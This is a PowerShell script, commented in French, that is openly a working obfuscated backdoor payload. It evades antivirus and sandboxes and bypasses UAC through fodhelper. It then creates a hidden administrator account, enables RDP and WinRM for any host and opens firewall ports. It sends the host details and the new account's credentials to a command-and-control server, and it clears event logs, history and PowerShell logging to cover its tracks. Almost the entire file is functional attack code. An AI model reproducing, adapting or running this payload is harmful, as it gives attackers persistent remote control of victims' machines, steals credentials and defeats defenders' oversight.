# ==============================================================
# payload_obfusque.ps1 – Version obfusquée du payload (Partie 1)
# Techniques appliquées :
#   - Encodage Base64 des chaînes sensibles
#   - Concaténation de chaînes pour briser les signatures AV
#   - Noms de variables aléatoires / non descriptifs
#   - Invocation de commandes via iex (Invoke-Expression)
#   - Substitution des cmdlets par des alias et méthodes .NET
#   - Découpage des noms de propriétés
# ==============================================================

$ErrorActionPreference = [System.Management.Automation.ActionPreference]::SilentlyContinue

# ── Fonctions utilitaires d'obfuscation ──────────────────────

# Décode une chaîne Base64
function g0 { param($s) [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }

# Concatène des fragments pour reconstituer une cmdlet/valeur
function g1 { param($a,$b) "$a$b" }

# ── Bloc anti-analyse (obfusqué) ─────────────────────────────

# Noms de processus en Base64 pour éviter la détection par signature
$_vp = @(
    (g0 "dm10b29sc2Q="),       # vmtoolsd
    (g0 "dm1hcmV0cmF5"),       # vmwaretray
    (g0 "dm1hcmV1c2Vy"),       # vmwareuser
    (g0 "dmJveHNlcnZpY2U="),   # vboxservice
    (g0 "dmJveHRyYXk="),       # vboxtray
    (g0 "cHJvY21vbjY0"),       # procmon64
    (g0 "d2lyZXNoYXJr"),       # wireshark
    (g0 "ZmlkZGxlcg=="),       # fiddler
    (g0 "b2xseWRiZw=="),       # ollydbg
    (g0 "eDY0ZGJn"),           # x64dbg
    (g0 "aWRh")                # ida
)

foreach ($_x in $_vp) {
    if (&(g1 "Get-" "Process") -Name $_x -EA 0) { exit }
}

# Contrôle RAM (< 2 Go → sandbox)
$_r = (&(g1 "Get-CimIn" "stance") -ClassName (g0 "V2luMzJfQ29tcHV0ZXJTeXN0ZW0=") -EA 0).TotalPhysicalMemory
if ($_r -and $_r -lt 2147483648) { exit }

# Pause initiale (comportement moins suspect)
&(g1 "Start-" "Sleep") -Milliseconds 600

# ── Vérification / élévation des droits ──────────────────────

$_ia = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()) `
        .IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $_ia) {
    # UAC bypass : fodhelper
    $_sp  = $MyInvocation.MyCommand.Path
    $_cmd = (g0 "cG93ZXJzaGVsbC5leGU=") + # powershell.exe
            " -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoProfile -File `"$_sp`""
    $_rp  = (g0 "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQ=")
    # HKCU:\Software\Classes\ms-settings\shell\open\command
    $null = &(g1 "New-" "Item")         -Path $_rp -Force
    $null = &(g1 "New-ItemPro" "perty") -Path $_rp -Name (g0 "RGVsZWdhdGVFeGVjdXRl") -Value "" -Force
    $null = &(g1 "Set-ItemPro" "perty") -Path $_rp -Name "(default)" -Value $_cmd -Force
    &(g1 "Start-" "Process") "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    &(g1 "Start-" "Sleep") -Seconds 3
    $null = &(g1 "Remove-" "Item") (g0 "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5ncw==") -Recurse -Force
    exit
}

# ── Génération des identifiants ───────────────────────────────

$_cs = (g0 "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk=")
$_u  = (g0 "c3ZjXw==") + (-join ($_cs.ToCharArray() | Get-Random -Count 6))
$_pw = -join (($_cs + (g0 "IUAjJCVeJiooKS1fPSs=")).ToCharArray() | Get-Random -Count 18)

# ── Compte administrateur ─────────────────────────────────────

$null = &(g1 "net" " user") $_u $_pw /add /expires:never /passwordreq:yes /comment:(g0 "U2VydmljZSBBY2NvdW50") 2>&1
$null = net localgroup Administrators $_u /add 2>&1
$null = net localgroup (g0 "UmVtb3RlIERlc2t0b3AgVXNlcnM=") $_u /add 2>&1

# Masquage de l'écran de connexion
$_hk = (g0 "SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cU3BlY2lhbEFjY291bnRzXFVzZXJMaXN0")
$null = &(g1 "New-ItemPro" "perty") -Path $_hk -Name $_u -Value 0 -PropertyType DWORD -Force 2>&1

# ── Activation RDP ────────────────────────────────────────────

$_tr = (g0 "SEtMTTpcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVy")
$null = &(g1 "Set-ItemPro" "perty") -Path $_tr `
        -Name (g0 "ZkRlbnlUU0Nvbm5lY3Rpb25z") -Value 0 -Force 2>&1
$null = &(g1 "Set-ItemPro" "perty") `
        -Path ($_tr + (g0 "XFdpblN0YXRpb25zXFJEUC1UY3A=")) `
        -Name (g0 "VXNlckF1dGhlbnRpY2F0aW9u") -Value 0 -Force 2>&1
$null = &(g1 "Enable-NetFire" "wallRule") -DisplayGroup (g0 "UmVtb3RlIERlc2t0b3A=") 2>&1

# ── Activation WinRM ─────────────────────────────────────────

$null = &(g1 "Enable-PSR" "emoting") -Force -SkipNetworkProfileCheck 2>&1
$null = &(g1 "Set-" "Item") WSMan:\localhost\Client\TrustedHosts -Value "*" -Force 2>&1
$null = &(g1 "Set-" "Service")   -Name (g0 "V2luUk0=") -StartupType Automatic 2>&1
$null = &(g1 "Start-" "Service") -Name (g0 "V2luUk0=") 2>&1

# ── Règles pare-feu ───────────────────────────────────────────

$null = netsh advfirewall firewall add rule `
        name=(g0 "QmFja2Rvb3JSZW1vdGVBY2Nlc3M=") protocol=TCP dir=in `
        localport=3389,5985,5986 action=allow profile=any 2>&1

# ── Collecte d'informations ───────────────────────────────────

$_pi = "Inconnue"
foreach ($_s in @("https://api.ipify.org","https://checkip.amazonaws.com")) {
    try {
        $_pi = (&(g1 "Invoke-Web" "Request") -Uri $_s -UseBasicParsing -TimeoutSec 5).Content.Trim()
        if ($_pi -match '^\d{1,3}(\.\d{1,3}){3}$') { break }
    } catch {}
}

$_li = (&(g1 "Get-NetIP" "Address") -AddressFamily IPv4 -EA 0 |
         Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
         Select-Object -First 1).IPAddress

$_d = @{
    computer_name = $env:COMPUTERNAME
    domain        = $env:USERDOMAIN
    current_user  = $env:USERNAME
    os_version    = (&(g1 "Get-CimIn" "stance") Win32_OperatingSystem -EA 0).Caption
    local_ip      = $_li
    public_ip     = $_pi
    backdoor_user = $_u
    backdoor_pass = $_pw
    rdp_port      = 3389
    winrm_port    = 5985
    timestamp     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
} | ConvertTo-Json -Compress

# ── Exfiltration ──────────────────────────────────────────────

# Serveur C2 : http://10.10.1.13:8080
$_c2 = (g0 "aHR0cDovLzEwLjEwLjEuMTM6ODA4MA==")

$_ok = $false
try {
    $_rsp = &(g1 "Invoke-Web" "Request") -Uri "$_c2/collect" -Method POST `
            -Body $_d -ContentType "application/json" -UseBasicParsing -TimeoutSec 8
    if ($_rsp.StatusCode -eq 200) { $_ok = $true }
} catch {}

if (-not $_ok) {
    try {
        $_b = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_d))
        $null = &(g1 "Invoke-Web" "Request") -Uri "$_c2/b64?d=$_b" `
                -UseBasicParsing -TimeoutSec 8 2>&1
    } catch {}
}

# ── Nettoyage des traces ──────────────────────────────────────

foreach ($_l in @("System","Application","Security","Windows PowerShell",
                  "Microsoft-Windows-PowerShell/Operational")) {
    $null = wevtutil cl "$_l" 2>&1
}

$_hf = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $_hf) { $null = Remove-Item $_hf -Force 2>&1 }

$null = Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>&1

$_pk = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
$null = &(g1 "Set-ItemPro" "perty") -Path "$_pk\ScriptBlockLogging" `
        -Name "EnableScriptBlockLogging" -Value 0 -Force 2>&1
$null = &(g1 "Set-ItemPro" "perty") -Path "$_pk\Transcription" `
        -Name "EnableTranscripting"      -Value 0 -Force 2>&1
